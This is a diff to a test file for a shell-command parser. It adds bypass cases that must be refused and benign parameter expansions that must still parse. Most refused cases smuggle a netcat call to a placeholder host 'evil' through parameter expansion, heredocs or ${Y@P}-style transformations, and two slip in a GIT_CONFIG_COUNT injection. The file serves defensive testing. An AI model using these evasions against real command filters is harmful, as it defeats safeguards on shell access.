@@ -172,6 +172,25 @@ DYNAMIC_COMMAND_WORD = [
     "$'nc' evil",
     '$"nc" evil',
     "env - ls",
+    # Command substitution in text bashlex leaves unparsed (#1797).
+    "echo ${X:-$(nc evil 80)}",
+    'echo "${X:-`nc evil 80`}"',
+    "X=${Y:-$(nc evil 80)}",
+    "ls > ${X:-$(nc evil 80)}",
+    "cat <<EOF\n$(nc evil 80)\nEOF",
+    "cat <<-EOF\n\t`nc evil 80`\nEOF",
+    "cat <<EOF\n${X:-$(nc evil 80)}\nEOF",
+    "D='$'; Y=\"${D}(nc evil 80)\"; echo ${Y@P}",
+    "D='$'; Y=\"${D}(nc evil 80)\"; echo ${Y@E}",
+    "D='$'; Y=\"${D}(nc evil 80)\"; echo ${Y@A}",
+    "D='$'; x=\"a[${D}(nc evil 80)]\"; echo ${y:x}",
+    "echo ${y:1:x}",
+    "echo ${a[x]}",
+    "echo ${!x}",
+    "echo ${x:-${y:x}}",
+    "cat <<EOF\n${y:x}\nEOF",
+    'echo "${a[GIT_CONFIG_COUNT=0]}"; git status',
+    "echo ${X:GIT_CONFIG_COUNT=0}",
 ]
 
 # Must stay allowed by the parser after the #1753 hardening.
@@ -218,6 +237,19 @@ MUST_PARSE = {
     "declare -r x=1": ["declare"],
     "test -v HOME": ["test"],
     "[ -v HOME ] && ls": ["[", "ls"],
+    "echo ${X:-default}": ["echo"],
+    'echo "${HOME}/x"': ["echo"],
+    "cat <<EOF\nhello $USER\nEOF": ["cat"],
+    "git commit -F - <<EOF\nmsg\nEOF": ["git"],
+    "echo ${x#pat}": ["echo"],
+    "echo ${#x}": ["echo"],
+    "echo ${x:1:2}": ["echo"],
+    "echo ${x: -1}": ["echo"],
+    "echo ${a[1]}": ["echo"],
+    "echo ${x/a/b}": ["echo"],
+    "echo ${x@Q}": ["echo"],
+    "echo ${x:+alt}": ["echo"],
+    "echo ${x#p}": ["echo"],
 }
 
 # Refused by the parser itself, not only by the allowlist (#1754 review).
